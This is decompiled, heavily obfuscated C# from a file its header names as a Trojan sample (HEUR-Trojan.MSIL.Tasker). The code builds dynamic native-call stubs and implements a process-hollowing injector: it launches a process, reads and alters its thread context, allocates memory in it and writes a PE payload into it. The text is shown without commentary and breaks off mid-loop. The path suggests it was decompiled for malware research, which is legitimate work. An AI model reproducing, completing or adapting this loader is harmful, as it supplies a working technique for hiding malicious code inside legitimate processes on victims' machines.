// Decompiled with JetBrains decompiler
// Type: get_UI
// Assembly: hoFmjnnAdk, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7549E1B6-C505-419B-ABCE-260ABB7A8C7E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-c76fad1f33ff3c6ef278984eb885771e7b42fcdcc88e8f3e5cd096a790f14c97.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

public static class get_UI
{
  private static get_UI.SAM1159 RangeCount = get_UI.GetInstance<get_UI.SAM1159>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("qHxYcKPikCSwQcxBVV3cvPhR02ZDeYf4", "hoFmjnnAdk"));
  private static get_UI.Stable CommonAssemblyInit = get_UI.GetInstance<get_UI.Stable>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("1rhKd86M+uuWm9kPMmipniiGCXCtxsOs", "hoFmjnnAdk"));
  private static get_UI.PreSearchPaths SpacingCombiningMark = get_UI.GetInstance<get_UI.PreSearchPaths>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("KeqsTj6IbgnIb0OkhVnX30uGopHJA6+a", "hoFmjnnAdk"));
  private static get_UI.DefaultPropertyAttribute LOCALE_SMONTHNAME2 = get_UI.GetInstance<get_UI.DefaultPropertyAttribute>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("5Bwo4tIrzwyICObhUS+fzA==", "hoFmjnnAdk"));
  private static get_UI.BasicHostType GetThreadLocalContext = get_UI.GetInstance<get_UI.BasicHostType>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("f/Gpu51pVkl+3HhmSFsCo9HZtHp4hggW", "hoFmjnnAdk"));
  private static get_UI.DefaultCalendar M_assemblyData = get_UI.GetInstance<get_UI.DefaultCalendar>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("fmrpFIBHXG4tZcACL0s+SE3+qYbtIJto", "hoFmjnnAdk"));
  private static get_UI.RecursionDecrement Set_MethodSemanticsTable = get_UI.GetInstance<get_UI.RecursionDecrement>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("FKn3D9fUaaTay8QRUpas3ApiqwkzciyJ", "hoFmjnnAdk"));
  private static get_UI.GetMethodProps Set_ModuleName = get_UI.GetInstance<get_UI.GetMethodProps>(\u003CModule\u003E.\u00A8\u008EÂµn("GbDfC6cGZj1oihMkhrChCA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("WCiYKn/E6DOANyLnWw4zUg==", "hoFmjnnAdk"));
  private static get_UI.ArraySig Set_PropertySig = get_UI.GetInstance<get_UI.ArraySig>(\u003CModule\u003E.\u00A8\u008EÂµn("kun05bVKkXtvYsWZtDubgA==", "hoFmjnnAdk"), \u003CModule\u003E.\u00A8\u008EÂµn("sz9oIy7/+radysai8jZzuWZayJtxN0PU", "hoFmjnnAdk"));

  public static \u0001 GetInstance<\u0001>(string _param0_1, string _param1)
  {
    AssemblyBuilder assemblyBuilder = (AssemblyBuilder) \u003CModule\u003E.\u0001ü\u000C\u002Aû(\u003CModule\u003E.\u0033\u0083\u00AF\u0007\u00AE(), \u003CModule\u003E.\u009Afhé\u007B(\u003CModule\u003E.\u00A8\u008EÂµn("5Us5wb/11VCKMmLQIC7dpBfTycCDLJun", "hoFmjnnAdk")), (AssemblyBuilderAccess) (Convert.ToInt32(1802460840.5 / 30020.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) + Convert.ToInt32(33856.859539503268 - Math.Sqrt(16863.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) - Convert.ToInt32(93550.47402003454 + Math.Sqrt(46883.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7"))));
    ModuleBuilder moduleBuilder = (ModuleBuilder) \u003CModule\u003E.Æ\u009F\u0080ÁE((object) assemblyBuilder, \u003CModule\u003E.\u00A8\u008EÂµn("5Us5wb/11VCnE7iNm8SCUQPJmby/wyTL", "hoFmjnnAdk"));
    TypeBuilder typeBuilder = (TypeBuilder) \u003CModule\u003E.õØ\u00A0Å1((object) moduleBuilder, "DynamicDllInvokeType", (TypeAttributes) ((Convert.ToInt32(2916570312.5 / 38187.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) + Convert.ToInt32(46808.630663521988 + Math.Log10(23406.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) - Convert.ToInt32(57655.459776849195 - Math.Log10(28825.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))) * (Convert.ToInt32(3933.0 - Math.Round(1311.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(34430.0 + Math.Tanh(17215.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Convert.ToInt32(37051.000395391224 - Math.Cos(18526.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")))));
    // ISSUE: type reference
    MethodInfo methodInfo1 = (MethodInfo) \u003CModule\u003E.Wîkå\u0001(\u003CModule\u003E.ncü\u007B\u002A(__typeref (\u0001)), \u003CModule\u003E.\u00A8\u008EÂµn("I0B3jRRjC7g=", "hoFmjnnAdk"));
    Type[] array = ((IEnumerable<ParameterInfo>) \u003CModule\u003E.\u00A8\u00813w\u0086((object) methodInfo1)).Select<ParameterInfo, Type>((Func<ParameterInfo, Type>) (_param0_2 => (Type) \u003CModule\u003E.\u00A1\u0092æ\u00A9R((object) _param0_2))).ToArray<Type>();
    MethodBuilder methodBuilder = (MethodBuilder) \u003CModule\u003E.a\u001B6Ú\u00A9((object) typeBuilder, _param1, _param0_1, (MethodAttributes) ((Convert.ToInt32(19549.0 + Math.Floor(19549.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) + Convert.ToInt32(18700.714305997717 - Math.Tan(9350.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) - Convert.ToInt32(49588.394311563228 - Math.Log10(24792.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"))) * (Convert.ToInt32(93209.0 - Math.Ceiling(31069.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(37762.028159364789 - Math.Tan(18881.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) - (int.Parse("1497643880") ^ int.Parse("1497742676")) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")))), (CallingConventions) (Convert.ToInt32(3706088418.0 / -43047.0) + Convert.ToInt32(102738.0 - Math.Truncate(34246.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) + Convert.ToInt32(17603.322321612122 - Math.Cos(8801.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5"))), \u003CModule\u003E.üºëî\u0081((object) methodInfo1), array, (CallingConvention) (Convert.ToInt32(-31500.5 - 31500.5) + Convert.ToInt32(51270.896240380884 + Math.Sin(25635.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(68808180.5 / 5865.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"))), (CharSet) ((Convert.ToInt32(2.0 * -35137.5) + Convert.ToInt32(55674.59531806146 - Math.Sqrt(27754.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) + Convert.ToInt32(22154.0 - Math.Ceiling(7384.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9"))) * (Convert.ToInt32(-16950.0 - -5650.0) + Convert.ToInt32(40494.0 + Math.Abs(40494.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) - (int.Parse("1469963541") ^ int.Parse("1469893922")) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")))));
    \u003CModule\u003E.\u00A1\u00BDQDB((object) methodBuilder, \u003CModule\u003E.ËMC\u002Eû((object) methodBuilder) | (MethodImplAttributes) ((Convert.ToInt32(2.0 * -11802.5) + Convert.ToInt32(2535.0 + Math.Ceiling(2535.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(9331.0 + Math.Round(9331.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1"))) * (Convert.ToInt32(-20540.5 - 20540.5) + Convert.ToInt32(17051.0 + Math.Truncate(17051.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(10470.0 - Math.Truncate(3490.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")))));
    Type type = (Type) \u003CModule\u003E.t\u0005\u002D\u0082\u0004((object) typeBuilder);
    MethodInfo methodInfo2 = (MethodInfo) \u003CModule\u003E.dÁÇo\u008D((object) type, _param1);
    // ISSUE: type reference
    return (\u0001) \u003CModule\u003E.\u009DîÙ\u0098Ñ((Type) \u003CModule\u003E.ncü\u007B\u002A(__typeref (\u0001)), methodInfo2, Convert.ToInt32(-146728.5 - -48909.5) + (int.Parse("32378346") ^ int.Parse("32440371")) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(412965060.5 / 14369.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) != 0);
  }

  public static bool _IsVisible(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    for (int index = Convert.ToInt32(-65657.5 - 65657.5) + Convert.ToInt32(110490.0 - Math.Round(36830.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(57651.540185486614 + Math.Log10(28828.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")); index <= (Convert.ToInt32(826.5 + 826.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(46193.0 + Math.Tanh(23097.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) - Convert.ToInt32(47831.917487986786 + Math.Log(23921.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9"))) * (Convert.ToInt32(493953880.5 / 15715.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(18407.126850061479 - Math.Log(9199.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) - Convert.ToInt32(49828.920850849157 - Math.Sin(24914.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7"))); index += Convert.ToInt32(2.0 * -2702.5) + Convert.ToInt32(29036.5 + 29036.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Convert.ToInt32(2.0 * 26333.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")))
    {
      if (\u003CModule\u003E.\u0035ß\u00B8\u001Cä(_param0, _param1, _param2, _param3))
        return Convert.ToInt32(-155625.0 - -51875.0) + Convert.ToInt32(13839.989909373129 - Math.Sin(6919.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(134868.0 - Math.Ceiling(44956.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) != 0;
    }
    return Convert.ToInt32(2545197204.5 / -35673.5) + Convert.ToInt32(40970.5 + Math.Abs(40970.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) - Convert.ToInt32(10594.271341017569 - Math.Sin(5297.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
  }

  public static bool AllowIdnStatic(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    int lpNumberOfBytesWritten = Convert.ToInt32(-44052.5 - 44052.5) + Convert.ToInt32(28676.0 + Math.Abs(28676.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) + Convert.ToInt32(15377.0 + Math.Truncate(15376.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length;
    string lpCommandLine = \u003CModule\u003E.db\u002B\u0021A("\"", _param0, "\"");
    get_UI.Set_HasFieldRVA startupInfo = new get_UI.Set_HasFieldRVA();
    get_UI.FullAppCompatMatch bljAlgdgocj = new get_UI.FullAppCompatMatch();
    // ISSUE: type reference
    startupInfo.Set_LocalSig = \u003CModule\u003E.\u0038\u005D\u00B3\u001F\u002C(\u003CModule\u003E.nÔü\u0027\u0019((Type) \u003CModule\u003E.ncü\u007B\u002A(__typeref (get_UI.Set_HasFieldRVA))));
    try
    {
      if (!\u003CModule\u003E.ï\u008D\u00ADcË(_param1))
        lpCommandLine = \u003CModule\u003E.db\u002B\u0021A(lpCommandLine, " ", _param1);
      if (!get_UI.Set_PropertySig(IntPtr.Zero, _param0, lpCommandLine, IntPtr.Zero, IntPtr.Zero, (int.Parse("-361441459") ^ int.Parse("361468430")) + Convert.ToInt32(97714.0 - Math.Tanh(48856.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) - Convert.ToInt32(1245404232.0 / 24954.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length != 0, (uint) ((Convert.ToInt32(2.0 * 4587.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(3261.0 - Math.Truncate(1087.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) - Convert.ToInt32(17018.0 - Math.Ceiling(5672.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2"))) * ((int.Parse("-859191377") ^ int.Parse("859287959")) + Convert.ToInt32(93238.013447770863 - Math.Sin(46619.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) + Convert.ToInt32(7570.7126229129626 + Math.Tan(3785.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")))), IntPtr.Zero, (string) null, ref startupInfo, ref bljAlgdgocj))
        throw \u003CModule\u003E.ÙDw\u0086k();
      int num1 = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, (Convert.ToInt32(27343.135752629329 - Math.Log10(13669.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(13323.244711308434 - Math.Cos(6661.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) - Convert.ToInt32(40606.3075174312 - Math.Log10(20301.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))) * (Convert.ToInt32(-35904.0 - 35904.0) + Convert.ToInt32(66219.519926387729 - Math.Log10(33107.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(8391.0 - Math.Abs(2797.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5"))));
      int num2 = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num1 + (Convert.ToInt32(-42238.0 - 42238.0) + Convert.ToInt32(37036.667685415377 + Math.Sqrt(18586.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(23677.5 + 23677.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("9"))) * (Convert.ToInt32(-129967.5 - -43322.5) + Convert.ToInt32(594.5 + 594.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(85663.708732278057 - Math.Sqrt(42728.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10"))));
      int[] context = new int[(Convert.ToInt32(2.0 * -6699.5) + (int.Parse("1747696402") ^ int.Parse("1747620626")) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Convert.ToInt32(62198.365641667478 + Math.Sin(31099.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11"))) * ((int.Parse("-686386364") ^ int.Parse("686409313")) + Convert.ToInt32(23257.0 - Math.Floor(7752.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8")) + Convert.ToInt32(28235.684130649264 - Math.Cos(14117.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")))];
      context[Convert.ToInt32(-67573.0 - 67573.0) + Convert.ToInt32(37128.0 + Math.Floor(37127.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(91337.0 - Math.Round(30445.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length] = (Convert.ToInt32(3101805084.5 / -39381.5) + Convert.ToInt32(2.0 * 31510.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) + Convert.ToInt32(121920.0 - Math.Ceiling(40640.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))) * (Convert.ToInt32(-2700.0 - 2700.0) + Convert.ToInt32(20399.0 + 20399.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) - Convert.ToInt32(35263.964290508149 + Math.Sqrt(17698.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")));
      if (\u003CModule\u003E.\u00A1K\u007F\u008B\u001E() != (Convert.ToInt32(-103027.5 - -34342.5) + Convert.ToInt32(102975.0 - 34325.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(38.204185030186053 + Math.Cos(19.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))) * ((int.Parse("-1845786") ^ int.Parse("1935489")) + Convert.ToInt32(39665.0 + Math.Ceiling(39665.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(27832.950690699789 + Math.Sin(13916.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))))
      {
        int num3 = get_UI.RangeCount(bljAlgdgocj.CreateSemaphore, context) ? 1 : 0;
      }
      else
      {
        int num4 = get_UI.CommonAssemblyInit(bljAlgdgocj.CreateSemaphore, context) ? 1 : 0;
      }
      int num5 = context[(Convert.ToInt32(239432844.5 / -10941.5) + Convert.ToInt32(39083.0 + Math.Floor(39083.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) - (int.Parse("1978898682") ^ int.Parse("1978876744")) / \u003CModule\u003E.TimeSpanToken(int.Parse("11"))) * ((int.Parse("-1062683363") ^ int.Parse("1062570175")) + Convert.ToInt32(48381.0 + Math.Truncate(48380.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(129177.0 - Math.Truncate(43059.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8")))];
      int lpBuffer1 = Convert.ToInt32(-16221.0 - 16221.0) + Convert.ToInt32(38860.5 - Math.Abs(12953.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) + Convert.ToInt32(6534.7587630271419 + Math.Sin(3267.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length;
      int num6 = get_UI.SpacingCombiningMark(bljAlgdgocj.Get_CustomMarshaler, num5 + (Convert.ToInt32(853919138.0 / -20663.0) + Convert.ToInt32(49504.0 + Math.Ceiling(49504.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) - Convert.ToInt32(86512.5 - Math.Abs(28837.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7"))) * (Convert.ToInt32(141372112.5 / 8407.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + (int.Parse("1080442693") ^ int.Parse("1080426635")) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) - Convert.ToInt32(33148.8638385841 + Math.Sin(16574.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1"))), lpBuffer1, (Convert.ToInt32(2.0 * -5622.5) + Convert.ToInt32(110529.0 - Math.Abs(36843.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) - Convert.ToInt32(93655.5 - Math.Abs(31218.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))) * (Convert.ToInt32(-76449.0 - -25483.0) + Convert.ToInt32(91129.741469080749 + Math.Tan(45567.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) - Convert.ToInt32(40308.716265827177 - Math.Sqrt(20083.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"))), ref lpNumberOfBytesWritten) ? 1 : 0;
      int dwSize = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num1 + (Convert.ToInt32(30666.0 - 10222.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) + Convert.ToInt32(12762.0 + Math.Ceiling(12762.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) - Convert.ToInt32(45898.0408117434 - Math.Log(22944.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8"))) * (Convert.ToInt32(14562759122.0 / -85331.0) + Convert.ToInt32(116706.0 - Math.Truncate(38902.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) + Convert.ToInt32(92848.254309687938 + Math.Log(46429.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7"))));
      int nSize = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num1 + (Convert.ToInt32(4736175138.0 / -48663.0) + Convert.ToInt32(19433.0 + Math.Tanh(9717.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8")) + Convert.ToInt32(77977.104846452115 - Math.Tan(38988.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11"))) * (Convert.ToInt32(2694440640.5 / -36704.5) + (int.Parse("59985924") ^ int.Parse("59913874")) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) - Convert.ToInt32(169059272.0 / 9194.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("8"))));
      bool flag = Convert.ToInt32(-117303.0 - -39101.0) + (int.Parse("1359704595") ^ int.Parse("1359732847")) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(20351.0 + Math.Round(20351.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length != 0;
      int lpBaseAddress = get_UI.LOCALE_SMONTHNAME2(bljAlgdgocj.Get_CustomMarshaler, \u003CModule\u003E.\u007D\u009A\u0081\u009CQ(num2), (uint) dwSize, (uint) ((Convert.ToInt32(-156535.5 - -52178.5) + Convert.ToInt32(111362.0 - Math.Ceiling(37120.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(63606.0 - Math.Floor(21202.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))) * (Convert.ToInt32(563506020.5 / -16785.5) + Convert.ToInt32(29784.0 + Math.Ceiling(29784.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) - Convert.ToInt32(38994.0 - Math.Abs(12998.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")))), (uint) ((Convert.ToInt32(-3587.5 - 3587.5) + Convert.ToInt32(18107.5 + 18107.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) - Convert.ToInt32(43464.0 - Math.Abs(14488.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"))) * (Convert.ToInt32(124456864.5 / -7888.5) + Convert.ToInt32(11260.5 + 11260.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) - Convert.ToInt32(6743.6424971277038 - Math.Tan(3371.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")))));
      if (!_param3 && lpBaseAddress == 0)
      {
        flag = Convert.ToInt32(-14344.5 - -4781.5) + Convert.ToInt32(58873.715868342384 + Math.Tan(29437.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Convert.ToInt32(49309.777277770729 - Math.Tan(24655.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) != 0;
        lpBaseAddress = get_UI.LOCALE_SMONTHNAME2(bljAlgdgocj.Get_CustomMarshaler, \u003CModule\u003E.\u007D\u009A\u0081\u009CQ(Convert.ToInt32(-61867.5 - 61867.5) + Convert.ToInt32(37843.0 - Math.Floor(12614.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) + Convert.ToInt32(4851716018.0 / 49253.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("8")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length), (uint) dwSize, (uint) ((Convert.ToInt32(2.0 * -9974.0) + Convert.ToInt32(39907.0 + Math.Abs(39907.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) - Convert.ToInt32(23789.0 + Math.Round(23789.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8"))) * ((int.Parse("-245377222") ^ int.Parse("245401237")) + Convert.ToInt32(19989.789709629273 + Math.Log(9999.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(12313.5 + 12313.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")))), (uint) ((Convert.ToInt32(11809539612.5 / -76842.5) + Convert.ToInt32(65238.642345335771 + Math.Tan(32619.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(88510.816362954 + Math.Cos(44255.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1"))) * (Convert.ToInt32(49430.090842870406 - Math.Tan(24715.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) + Convert.ToInt32(40837.0 - Math.Truncate(13612.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) - Convert.ToInt32(114981.0 - Math.Floor(38327.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")))));
      }
      if (lpBaseAddress == 0)
        throw \u003CModule\u003E.ÙDw\u0086k();
      int num7 = get_UI.GetThreadLocalContext(bljAlgdgocj.Get_CustomMarshaler, lpBaseAddress, _param2, nSize, out lpNumberOfBytesWritten) ? 1 : 0;
      int num8 = num1 + (Convert.ToInt32(-79517.5 - 79517.5) + Convert.ToInt32(72369.0 - Math.Tanh(36184.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(43458.0 + Math.Truncate(43457.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("8"))) * (Convert.ToInt32(9457.0 + Math.Tanh(4729.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) + Convert.ToInt32(14420.5 + Math.Abs(14420.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) - Convert.ToInt32(38288.139994226076 + Math.Log(19149.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")));
      short num9 = \u003CModule\u003E.\u0098\u00BB0\u0089\u0025(_param2, num1 + (Convert.ToInt32(395.31418279724119 + Math.Tan(197.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) + Convert.ToInt32(76865.0 - Math.Tanh(38432.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) - Convert.ToInt32(77448.534984163125 - Math.Sqrt(38626.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3"))) * (Convert.ToInt32(5810420000.0 / -53900.0) + Convert.ToInt32(7710.0 + Math.Ceiling(7710.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(138570.0 - Math.Ceiling(46190.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))));
      int num10 = Convert.ToInt32(-28490.5 - 28490.5) + Convert.ToInt32(8194.0 - Math.Truncate(2731.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(77277.0 - Math.Truncate(25759.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Type.EmptyTypes.Length + Type.EmptyTypes.Length;
      do
      {
        int num11 = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num8 + (Convert.ToInt32(71368.0 - Math.Floor(23789.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(89418564.5 / 6686.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) - Convert.ToInt32(91410.0 - 30470.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("2"))) * (Convert.ToInt32(1449.0 + 1449.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) + Convert.ToInt32(735.0 + Math.Abs(735.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) - Convert.ToInt32(2184.0 + Math.Floor(2183.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6"))));
        int length = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num8 + (Convert.ToInt32(-48160.0 - 48160.0) + Convert.ToInt32(15624.254010447201 - Math.Tan(7812.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) + Convert.ToInt32(40356.0 + Math.Truncate(40355.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10"))) * (Convert.ToInt32(-10150.5 - 10150.5) + Convert.ToInt32(50302.132454117156 - Math.Log(25146.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) - Convert.ToInt32(29990.984152931716 + Math.Cos(14995.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14"))));
